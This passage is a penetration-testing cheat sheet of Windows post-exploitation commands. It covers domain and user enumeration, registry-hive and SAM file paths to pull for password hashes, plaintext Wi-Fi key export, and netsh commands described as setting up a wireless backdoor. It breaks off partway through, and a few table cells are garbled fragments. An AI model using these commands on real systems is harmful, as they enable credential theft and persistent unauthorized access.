<html><head><title>Windows Post-Exploitation Command List</title><style type="text/css">ol{margin:0;padding:0}.c50{vertical-align:top;width:37.4pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c51{vertical-align:top;width:162.6pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c6{vertical-align:top;width:346.5pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c27{vertical-align:top;width:189pt;border-style:solid;border-color:#000000;border-width:1pt;padding:0.7pt 0.7pt 0.7pt 0.7pt}.c42{vertical-align:top;width:154.5pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c44{vertical-align:top;width:249.9pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c37{vertical-align:top;width:351.4pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c40{vertical-align:top;width:37.4pt;border-style:solid;border-color:#000000;border-width:1pt;padding:0.7pt 0.7pt 0.7pt 0.7pt}.c22{vertical-align:top;width:192.8pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c17{vertical-align:top;width:228.8pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c43{vertical-align:top;width:204.6pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c53{vertical-align:top;width:133.6pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c41{vertical-align:top;width:216pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c33{vertical-align:top;width:380.4pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c49{vertical-align:top;width:297.8pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c29{vertical-align:top;width:252pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c8{vertical-align:top;width:358.8pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c32{vertical-align:top;width:343pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c12{vertical-align:top;width:285.8pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c4{vertical-align:top;width:171pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c36{vertical-align:top;width:189pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c14{vertical-align:top;width:360pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c21{vertical-align:top;width:155.2pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c47{vertical-align:top;width:159.8pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c59{vertical-align:top;width:149.6pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c30{vertical-align:top;width:122.2pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c57{vertical-align:top;width:153.8pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c2{vertical-align:top;width:264.1pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c15{vertical-align:top;width:167.2pt;border-style:solid;border-color:#000000;border-width:1pt;padding:5pt 5pt 5pt 5pt}.c28{padding-left:0pt;direction:ltr;margin-left:72pt}.c19{list-style-type:disc;margin:0;padding:0}.c55{list-style-type:circle;margin:0;padding:0}.c1{line-height:1.0;direction:ltr;margin-left:36pt}.c18{line-height:1.0;direction:ltr}.c61{max-width:504pt;padding:54pt 54pt 54pt 54pt}.c10{color:inherit;text-decoration:inherit}.c54{margin:5px;border:1px solid black}.c9{direction:ltr;margin-left:36pt}.c56{padding-left:0pt;margin-left:108pt}.c0{color:#000099;text-decoration:underline}.c3{color:#1155cc;text-decoration:underline}.c34{direction:ltr;margin-left:18pt}.c24{font-size:24pt;background-color:#ffffff}.c23{font-size:14pt;background-color:#ffffff}.c62{height:12pt}.c7{border-collapse:collapse}.c46{padding-bottom:10pt}.c60{height:37pt}.c25{color:#ff0000}.c5{height:0pt}.c20{font-weight:bold}.c39{text-align:center}.c31{line-height:1.0}.c64{height:36pt}.c66{text-align:right}.c16{line-height:1.15}.c13{height:11pt}.c58{height:39pt}.c45{height:18pt}.c65{height:25pt}.c48{height:24pt}.c63{font-size:10pt}.c38{font-size:14pt}.c11{height:33pt}.c26{font-size:9pt}.c35{direction:ltr}.c52{background-color:#ffffff}.title{padding-top:24pt;line-height:1.15;text-align:left;color:#000000;font-size:36pt;font-family:"Arial";font-weight:bold;padding-bottom:6pt}.subtitle{padding-top:18pt;line-height:1.15;text-align:left;color:#666666;font-style:italic;font-size:24pt;font-family:"Georgia";padding-bottom:4pt}li{color:#000000;font-size:11pt;font-family:"Arial"}p{color:#000000;font-size:11pt;margin:0;font-family:"Arial"}h1{padding-top:24pt;line-height:1.0;text-align:left;color:#000000;font-size:24pt;font-family:"Arial";font-weight:bold;padding-bottom:6pt}h2{padding-top:18pt;line-height:1.0;text-align:left;color:#000000;font-size:18pt;font-family:"Arial";font-weight:bold;padding-bottom:4pt}h3{padding-top:14pt;line-height:1.0;text-align:left;color:#000000;font-size:14pt;font-family:"Arial";font-weight:bold;padding-bottom:4pt}h4{padding-top:12pt;line-height:1.0;text-align:left;color:#000000;font-size:12pt;font-family:"Arial";font-weight:bold;padding-bottom:2pt}h5{padding-top:11pt;line-height:1.0;text-align:left;color:#000000;font-size:11pt;font-family:"Arial";font-weight:bold;padding-bottom:2pt}h6{padding-top:10pt;line-height:1.0;text-align:left;color:#000000;font-size:10pt;font-family:"Arial";font-weight:bold;padding-bottom:2pt}</style></head><body class="c52 c61"><div><p class="c13 c35"><span></span></p></div><p class="c39 c35"><span class="c24 c20">Windows Post-Exploitation </span></p><p class="c39 c35"><span class="c20 c24">Command Execution </span></p><p class="c39 c35"><span class="c23">If for any reason you cannot access/edit these files in the future, please contact</span></p><p class="c39 c35"><span class="c3 c23"><a class="c10" href="mailto:mubix@hak5.org">mubix@hak5.org</a></span></p><p class="c39 c35"><span class="c23">You can download these files in any format using Google Doc&rsquo;s</span></p><p class="c39 c35"><span class="c23">File-&gt;Download As method</span></p><p class="c39 c35"><span class="c23">If you are viewing this on anything other than Google Docs then you can get</span></p><p class="c39 c35"><span class="c23">access to the latest links to the Linux/Unix/BSD, OS X, Obscure, Metasploit, and Windows here</span><span class="c38">:</span><span class="c38"><a class="c10" href="http://bit.ly/nuc0N0">&nbsp;</a></span><span class="c0 c38"><a class="c10" href="http://bit.ly/nuc0N0">http://bit.ly/nuc0N0</a></span></p><p class="c39 c13 c35"><span class="c0 c23"></span></p><p class="c39 c35"><span class="c23 c25">DISCLAIMER: Anyone can edit these docs, and all that entails and implies</span></p><h4 class="c9 c39 c62"><a name="h.innfm5huivpv"></a></h4><h1 class="c9 c39 c48"><a name="h.36diw0tzqny8"></a></h1><p class="c39 c13 c35"><span class="c52"></span></p><h1 class="c9"><a name="h.kbdh3njycv5v"></a><span class="c52">&nbsp;</span></h1><hr style="page-break-before:always;display:none;"><h1 class="c9 c48"><a name="h.y5w9p7e0yt0f"></a></h1><h1 class="c9 c48"><a name="h.bi95dtsgp7cp"></a></h1><p class="c1 c39"><span>Table </span><span>of Contents </span></p><p class="c9 c13"><span></span></p><p class="c9 c13 c46"><span class="c0"></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.8afh3d57sx9g">Blind Files</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.7j1znj5c35ds">Non Interactive Command Execution</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.39aqq3d1e7h0">System</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.wxdrfg2sfisk">Networking (ipconfig, netstat, net)</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.2dppgmyixmz0">Configs</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.z1f4fk915re1">Finding Important Files</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.ufpocum8urv">Files To Pull (if possible)</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.7khdkf91zisc">Remote System Access</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.yz8d0rpmjxav">Auto-Start Directories</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.olmlns7ipvwp">Binary Planting</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.7h30potwraal">WMI</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.7u33sdu4oulz">Reg Command exit</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.95llvp1i0eel">Deleting Logs</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.89lj4wom3v17">Uninstalling Software &ldquo;AntiVirus&rdquo; (Non interactive)</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.n8l5wator02h"># Other &nbsp;(to be sorted)</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.7oizdbqttnpe">OS SPECIFIC</a></span></p><p class="c9"><span class="c3"><a class="c10" href="#h.oj5zwh1fmxad">Win2k3</a></span></p><p class="c9"><span class="c3"><a class="c10" href="#h.anvlrk8jqsf5">Vista/7</a></span></p><p class="c9"><span class="c3"><a class="c10" href="#h.fpk0evmlh5z7">Vista SP1/7/2008/2008R2 (x86 &amp; x64)</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.xkz5gclfsvrj">Invasive or Altering Commands</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.vec9dd91nzt">Support Tools Binaries / Links / Usage</a></span></p><p class="c34"><span class="c3"><a class="c10" href="#h.ffa43r4w2v79">Third Party Portable Tools</a></span></p><p class="c13 c35"><span class="c0"></span></p><p class="c9 c46 c13"><span class="c0"></span></p><h2 class="c9 c16 c45"><a name="h.c6hzyag2acqo"></a></h2><hr style="page-break-before:always;display:none;"><h2 class="c9 c16"><a name="h.8afh3d57sx9g"></a><span>Blind Files</span></h2><p class="c9"><span>(Things to pull when all you can do is to blindly read) LFI/Directory traversal(s).<br>Files that will have the same name across networks / Windows domains / systems.</span></p><p class="c9 c13"><span></span></p><a href="#" name="b6a1b7466db673ce21e6edb88b62b0f1ed417398"></a><a href="#" name="0"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c41"><p class="c9"><span class="c20">File</span></p></td><td class="c49"><p class="c9"><span class="c20">Expected Contents / Description</span></p></td></tr><tr class="c5"><td class="c41"><p class="c9"><span>%SYSTEMDRIVE%\boot.ini</span></p></td><td class="c49"><p class="c9"><span>A file that can be counted on to be on virtually every windows host. Helps with confirmation that a read is happening.</span></p></td></tr><tr class="c5"><td class="c41"><p class="c1"><span>%WINDIR%\win.ini</span></p></td><td class="c49"><p class="c1"><span>This is another file to look for if boot.ini isn&rsquo;t there or coming back, which is some times the case.</span></p></td></tr><tr class="c64"><td class="c41"><p class="c1"><span>%SYSTEMROOT%\repair\SAM</span></p><p class="c1 c13"><span></span></p><p class="c1"><span>%SYSTEMROOT%\System32\config\RegBack\SAM</span></p></td><td class="c49"><p class="c1"><span>It stores users&#39; passwords in a hashed format (in</span><span><a class="c10" href="https://secure.wikimedia.org/wikipedia/en/wiki/LM_hash">&nbsp;</a></span><span class="c0"><a class="c10" href="https://secure.wikimedia.org/wikipedia/en/wiki/LM_hash">LM hash</a></span><span>&nbsp;and</span><span><a class="c10" href="https://secure.wikimedia.org/wikipedia/en/wiki/NTLM">&nbsp;</a></span><span class="c0"><a class="c10" href="https://secure.wikimedia.org/wikipedia/en/wiki/NTLM">NTLM</a></span><span>&nbsp;hash).</span></p></td></tr><tr class="c5"><td class="c41"><p class="c1"><span>%SYSTEMROOT%\repair\system</span></p><p class="c1"><span>%SYSTEMROOT%\System32\config\RegBack\system</span></p></td><td class="c49"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c41"><p class="c1"><span>&gt;insert new rows above this line&lt;</span></p></td><td class="c49"><p class="c1"><span class="c20">SEE IMPORTANT FILES SECTION FOR MORE IDEAS</span></p></td></tr></tbody></table><p class="c9 c13"><span class="c20"></span></p><h2 class="c9"><a name="h.7j1znj5c35ds"></a><span>Non Interactive Command Execution</span></h2><p class="c1 c13"><span></span></p><a href="#" name="22263abab4924150ac9f9e31b050fff37573f1b3"></a><a href="#" name="1"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c57"><p class="c9"><span>s</span></p></td><td class="c14"><p class="c9 c13"><span></span></p></td></tr></tbody></table><p class="c1 c13"><span></span></p><p class="c1 c13"><span></span></p><h2 class="c9"><a name="h.39aqq3d1e7h0"></a><span>System</span></h2><p class="c1 c13"><span></span></p><a href="#" name="c5b91bc79623111b6ff220e669b150765053a3df"></a><a href="#" name="2"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c60"><td class="c42"><p class="c9"><span class="c20">Command</span></p></td><td class="c14"><p class="c9"><span class="c20">Expected Output or Description</span></p></td></tr><tr class="c5"><td class="c42"><p class="c9"><span class="c20">whoami</span></p></td><td class="c14"><p class="c9"><span>Lists your current user. Not present in all versions of Windows; however shall be present in Windows NT 6.0-6.1.</span></p></td></tr><tr class="c5"><td class="c42"><p class="c1"><span>whoami /all</span></p></td><td class="c14"><p class="c1"><span>Lists current user, sid, groups current user is a member of and their sids as well as current privilege level.</span></p></td></tr><tr class="c5"><td class="c42"><p class="c1"><span>set</span></p></td><td class="c14"><p class="c1"><span>Shows all current environmental variables. Specific ones to look for are USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE.</span></p></td></tr><tr class="c5"><td class="c42"><p class="c1"><span>fsutil fsinfo drives</span></p></td><td class="c14"><p class="c1"><span>Must be an administrator to run this, but it lists the current drives on the system.</span></p></td></tr><tr class="c5"><td class="c42"><p class="c1"><span class="c52 c63">reg query HKLM /s /d /f &quot;C:\* *.exe&quot; | find /I &quot;C:\&quot; | find /V &quot;&quot;&quot;&quot;</span></p></td><td class="c14"><p class="c1"><span>curely registered executable</span><span>s</span><span>&nbsp;within the system registry on Windows 7. </span></p></td></tr></tbody></table><p class="c1 c13"><span></span></p><h2 class="c9"><a name="h.wxdrfg2sfisk"></a><span>Networking (ipconfig, netstat, net)</span></h2><p class="c1 c13"><span></span></p><a href="#" name="773d3f86cbdd16148311e3c37969fe07719b91a1"></a><a href="#" name="3"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c15"><p class="c1"><span class="c20">Command</span></p></td><td class="c6"><p class="c1"><span class="c20">Expected Output or Description</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>ipconfig /all</span></p></td><td class="c6"><p class="c1"><span>Displays the full information about your NIC&rsquo;s.</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>ipconfig /displaydns</span></p></td><td class="c6"><p class="c1"><span>Displays your local DNS cache.</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>netstat -nabo</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>netstat -s -p [tcp|udp|icpm|ip]</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>netstat -r</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>netstat -na | findstr :445</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>netstat -nao | findstr LISTENING</span></p></td><td class="c6"><p class="c1"><span>XP and up for -o flag to get PIDnet acc</span></p></td></tr><tr class="c64"><td class="c15"><p class="c1"><span>netstat -nao | findstr LISTENING</span></p></td><td class="c6"><p class="c9"><span>XP and up for -o flag to get PID</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>netstat -na | findstr LISTENING</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1 c13"><span></span></p><p class="c1"><span>netsh diag show all</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net view</span></p></td><td class="c6"><p class="c1"><span>Queries NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup.</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net view /domain</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net view /domain:otherdomain</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net user %USERNAME% /domain</span></p></td><td class="c6"><p class="c1"><span>Pulls information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. Important things to note are login times, last time changed password, logon scripts, and group membership</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net user /domain</span></p></td><td class="c6"><p class="c1"><span>Lists all of the domain users</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net accounts</span></p></td><td class="c6"><p class="c1"><span>Prints the password policy for the local system. This can be different and superseded by the do</span><span>ai</span><span>mn policy.</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net accounts /domain</span></p></td><td class="c6"><p class="c1"><span>Prints the password policy for the domain</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net localgroup administrators</span></p></td><td class="c6"><p class="c1"><span>Prints the members of the Administrators local group</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net localgroup administrators /domain</span></p></td><td class="c6"><p class="c1"><span>as this was supposed to use localgroup &amp; domain, this actually another way of getting *current* domain admins</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net group &ldquo;Domain Admins&rdquo; /domain</span></p></td><td class="c6"><p class="c1"><span>Prints the members of the Domain Admins group</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net group &ldquo;Enterprise Admins&rdquo; /domain</span></p></td><td class="c6"><p class="c1"><span>Prints the members of the Enterprise Admins group</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net group &ldquo;Domain Controllers&rdquo; /domain</span></p></td><td class="c6"><p class="c1"><span>Prints the list of Domain Controllers for the current domain</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>nbtstat -a [ip here]</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net share</span></p></td><td class="c6"><p class="c1"><span>Displays your currently shared SMB entries, and what path(s) they point to</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>net session | find / &ldquo;\\&rdquo;</span></p></td><td class="c6"><p class="c18 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>arp -a</span></p></td><td class="c6"><p class="c1"><span>Lists all the systems currently in the machine&rsquo;s ARP table. </span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>route print</span></p></td><td class="c6"><p class="c1"><span>Prints the machine&rsquo;s routing table. This can be good for finding other networks and static routes that have been put in place</span></p></td></tr><tr class="c5"><td class="c15"><p class="c1"><span>browstat (Not working on XP)</span></p></td><td class="c6"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c15"><p class="c1 c13"><span></span></p><p class="c1"><span>netsh wlan show profiles</span></p><p class="c1 c13"><span></span></p></td><td class="c6"><p class="c1"><span>shows all saved wireless profiles. You may then export the info for those profiles with the command below</span></p></td></tr><tr><td class="c15"><p class="c1"><span>netsh wlan export profile folder=. key=clear</span></p></td><td class="c6"><p class="c1"><span>exports a user wifi profile with the password in plaintext to an xml file in the current working directory</span></p><p class="c1 c13"><span></span></p></td></tr><tr><td class="c15"><p class="c1"><span>netsh wlan [start|stop] hostednetwork</span></p><p class="c1 c13"><span></span></p></td><td class="c6"><p class="c1"><span>Starts or stops a wireless backdoor on a windows 7 pc</span></p></td></tr><tr><td class="c15"><p class="c1"><span>netsh wlan set hostednetwork ssid=&lt;ssid&gt; key=&lt;passphrase&gt; keyUsage=persistent|temporary</span></p><p class="c1 c13"><span></span></p></td><td class="c6"><p class="c1"><span>Complete hosted network setup for creating a wireless backdoor on win 7</span></p></td></tr><tr><td class="c15"><p class="c1"><span>netsh wlan set hostednetwork mode=[allow|disallow]</span></p><p class="c1 c13"><span></span></p></td><td class="c6"><p class="c1"><span>enables or disables hosted network service</span></p><p class="c1 c13"><span></span></p></td></tr><tr><td class="c15"><p class="c18"><span>wmic ntdomain list</span></p></td><td class="c6"><p class="c18"><span>Retrieve information about Domain and Domain Controller</span></p></td></tr><tr><td class="c15"><p class="c18 c13"><span></span></p></td><td class="c6"><p class="c18 c13"><span></span></p></td></tr></tbody></table><p class="c35"><span>&nbsp; &nbsp;</span></p><ol class="c19" start="1"><li class="c28"><span>http://www.securityaegis.com/ntsd-backdoor/</span></li></ol><p class="c9 c13"><span></span></p><h2 class="c9"><a name="h.2dppgmyixmz0"></a><span>Configs</span></h2><p class="c1 c13"><span></span></p><a href="#" name="958aadc97bd946804d1b44f55597dd784f5e3a73"></a><a href="#" name="4"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c44"><p class="c9"><span class="c20">Command</span></p></td><td class="c2"><p class="c9"><span class="c20">Expected Output or Description</span></p></td></tr><tr class="c5"><td class="c44"><p class="c9"><span>gpresult /z</span></p></td><td class="c2"><p class="c9"><span>Extremely verbose output of GPO (Group policy) settings as applied to the current system and user</span></p></td></tr><tr class="c5"><td class="c44"><p class="c1"><span>sc qc</span></p></td><td class="c2"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c44"><p class="c1"><span>sc query</span></p></td><td class="c2"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c44"><p class="c1"><span>sc queryex</span></p></td><td class="c2"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c44"><p class="c1"><span>type %WINDIR%\System32\drivers\etc\hosts</span></p></td><td class="c2"><p class="c1"><span>Print the contents of the Windows hosts file</span></p></td></tr><tr class="c60"><td class="c44"><p class="c1"><span>j</span></p></td><td class="c2"><p class="c1"><span>Prints a directory listing of the Program Files directory.</span></p></td></tr><tr class="c5"><td class="c44"><p class="c1"><span>echo %COMSPEC%</span></p></td><td class="c2"><p class="c1"><span>Usually going to be cmd.exe in the Windows directory, but it&rsquo;s good to know for sure.</span></p><p class="c18 c13"><span></span></p></td></tr></tbody></table><h2 class="c9"><a name="h.w6fcqarxqkye"></a><span>c:\windows\system32\gathernetworkinfo.vbs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Included script with Windows7, enumerates </span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>registry, firewall config, dns cache, etc.</span></h2><h2 class="c9"><a name="h.z1f4fk915re1"></a><span>Finding Important Files</span></h2><p class="c1 c13"><span></span></p><a href="#" name="b584555aec9687fe1fd9f39693312c30b131a243"></a><a href="#" name="5"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c51"><p class="c1"><span>Command</span></p></td><td class="c37"><p class="c1"><span>Description / Reason</span></p></td></tr><tr class="c5"><td class="c51"><p class="c1"><span>tree C:\ /f /a &gt; C:\output_of_tree.txt</span></p></td><td class="c37"><p class="c1"><span>Prints a directory listing in &lsquo;tree&rsquo; format. The /a makes the tree printed with ASCII characters instead of special ones and the /f displays file names as well as folders</span></p></td></tr><tr class="c5"><td class="c51"><p class="c1"><span>dir /a</span></p></td><td class="c37"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c51"><p class="c1"><span>dir /b /s [Directory or Filename]</span></p></td><td class="c37"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c51"><p class="c1"><span>dir \ /s /b | find /I &ldquo;searchstring&rdquo;</span></p></td><td class="c37"><p class="c1"><span>Searches the output of dir from the root of the drive current drive (\) and all sub drectories (/s) using the &lsquo;base&rsquo; format (/b) so that it outputs the full path for each listing, for &lsquo;searchstring&rsquo; anywhere in the file name or path.</span></p></td></tr><tr class="c5"><td class="c51"><p class="c1"><span>command | find /c /v &ldquo;&rdquo;</span></p></td><td class="c37"><p class="c1"><span>Counts the lines of whatever you use for &lsquo;command&rsquo;</span></p></td></tr></tbody></table><p class="c9 c13"><span></span></p><h2 class="c9"><a name="h.ufpocum8urv"></a><span>Files To Pull (if possible)</span></h2><p class="c1 c13"><span></span></p><a href="#" name="db8d78cd4c2475cd80eef5f3b9ea985b06623d1c"></a><a href="#" name="6"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c8"><p class="c1"><span class="c20">File location</span></p></td><td class="c21"><p class="c1"><span class="c20">Description / Reason</span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%SYSTEMDRIVE%\pagefile.sys</span></p><p class="c1 c13"><span></span></p></td><td class="c21"><p class="c1"><span>Large file, but contains spill over from RAM, usually lots of good information can be pulled, but should be a last resort due to size</span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\debug\NetSetup.log</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\repair\sam</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\repair\system</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\repair\software</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\repair\security</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\iis6.log (5, 6 or 7)</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\system32\logfiles\httperr\httperr1.log</span></p></td><td class="c21"><p class="c1"><span>IIS 6 error log</span></p></td></tr><tr class="c5"><td class="c8"><p class="c1"><span>%SystemDrive%\inetpub\logs\LogFiles </span></p></td><td class="c21"><p class="c1"><span>IIS 7&rsquo;s logs location</span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\system32\logfiles\w3svc1\exYYMMDD.log (year month day)</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\system32\config\AppEvent.Evt</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\system32\config\SecEvent.Evt</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\system32\config\default.sav</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\system32\config\security.sav</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\system32\config\software.sav</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\system32\config\system.sav</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\system32\CCM\logs\*.log</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c65"><td class="c8"><p class="c9"><span>%USERPROFILE%\ntuser.dat</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c8"><p class="c9"><span>%WINDIR%\System32\drivers\etc\hosts</span></p></td><td class="c21"><p class="c1 c13"><span></span></p></td></tr><tr><td class="c8"><p class="c1"><span>unattend.txt, unattend.xml, sysprep.inf</span></p></td><td class="c21"><p class="c1"><span>Used in the automated deployment of windows images and can contain user accounts. No known default location.</span></p></td></tr></tbody></table><p class="c1 c13"><span></span></p><p class="c9 c13"><span></span></p><h2 class="c9"><a name="h.7khdkf91zisc"></a><span>Remote System Access&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></h2><p class="c9 c13"><span></span></p><a href="#" 